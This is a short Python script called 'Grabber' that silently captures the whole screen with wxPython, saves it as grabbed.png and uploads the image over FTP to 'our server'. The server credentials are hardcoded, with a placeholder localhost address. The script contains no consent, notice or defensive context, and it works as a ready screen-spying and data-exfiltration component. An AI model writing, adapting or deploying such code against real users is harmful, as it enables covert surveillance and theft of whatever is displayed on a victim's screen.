#!/usr/bin/env python3

"""
Grabber

Used to take screenshots and send to our server using ftp.

It uses WX

"""

import wx
import os
import ftplib

# Credentials
IP = '127.0.0.1'
USER = 'ftp'
PASSWORD = '12345'

# Initialize the wx, screen and size
w = wx.App()
screen = wx.ScreenDC()
size = screen.GetSize()

bmap = wx.Bitmap(size[0], size[1])
memo = wx.MemoryDC(bmap)

memo.Blit(0,0, size[0], size[1], screen, 0, 0)

del memo

bmap.SaveFile('grabbed.png', wx.BITMAP_TYPE_PNG)


# Send to FTP

ftp_session = ftplib.FTP(IP, USER, PASSWORD)

with open('grabbed.png', 'rb') as f:
    ftp_session.storbinary("STOR grabbed.png", f)

ftp_session.close()